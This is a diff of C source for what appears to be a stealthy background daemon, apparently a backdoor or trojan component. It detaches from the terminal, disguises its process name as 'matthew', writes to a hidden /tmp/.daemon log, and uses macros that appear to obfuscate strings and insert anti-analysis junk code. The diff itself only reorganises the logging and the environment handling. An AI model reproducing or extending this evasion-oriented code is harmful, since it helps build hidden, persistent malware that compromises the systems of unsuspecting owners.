@@ -13,28 +13,12 @@
 #define NO_CLOSE_END 1
 #define MAX_CLIENTS 1
 
+extern char **g_envp;
+
 static int my_htons(int port)
 {
 	return ((port & 0xff) << 8) | ((port & 0xff00) >> 8);
 }
-
-#ifdef LOGGER
-static void logger(const char *msg)
-{
-	int fd = open(STR("/tmp/.daemon"), O_WRONLY | O_CREAT | O_APPEND, 0644);
-	if (fd == -1) {
-		return;
-	}
-
-	write(fd, msg, ft_strlen(msg));
-	close(fd);
-}
-#else
-static void logger(const char *msg)
-{
-	(void)msg;
-}
-#endif
 
 static int create_server(void)
 {
@@ -263,12 +247,6 @@ void run(int *lock_fd, char **envp)
 	unlock(lock_fd);
 }
 
-static void close_fds(void)
-{
-	for (int fd = 0; fd < 1024; fd++) {
-		close(fd);
-	}
-}
 
 static int attach_to_devnull(void)
 {
@@ -279,9 +257,7 @@ static int attach_to_devnull(void)
 
 	if (dup2(fd, STDIN_FILENO) < 0) {
 		return -1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	close(fd);
 
@@ -301,7 +277,7 @@ static int attach_to_devnull(void)
 	return 0;
 }
 
-int	daemonize(char **envp)
+int	daemonize(void)
 {
 	/* check if already locked, 
 	 * if not locked: doesnt lock but instead continues 
@@ -324,9 +300,7 @@ int	daemonize(char **envp)
 	if (setsid() == -1) {
 		logger(STR("setsid failed\n"));
 		return -1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	pid = fork();
 	if (pid < 0)
@@ -337,8 +311,6 @@ int	daemonize(char **envp)
 	char name[16] = "matthew";
 	prctl(PR_SET_NAME, name);
 	
-	close_fds();
-
 	if (attach_to_devnull() == -1) {
 		return -1;
 	}
@@ -353,6 +325,24 @@ int	daemonize(char **envp)
 		return 0;
 	}
 
-	run(&lock_fd, envp);
+	run(&lock_fd, g_envp);
 	return 0;
 }
+
+#ifdef LOGGER
+void logger(const char *msg)
+{
+	int fd = open(STR("/tmp/.daemon"), O_WRONLY | O_CREAT | O_APPEND, 0644);
+	if (fd == -1) {
+		return;
+	}
+
+	write(fd, msg, ft_strlen(msg));
+	close(fd);
+}
+#else
+void logger(const char *msg)
+{
+	(void)msg;
+}
+#endif
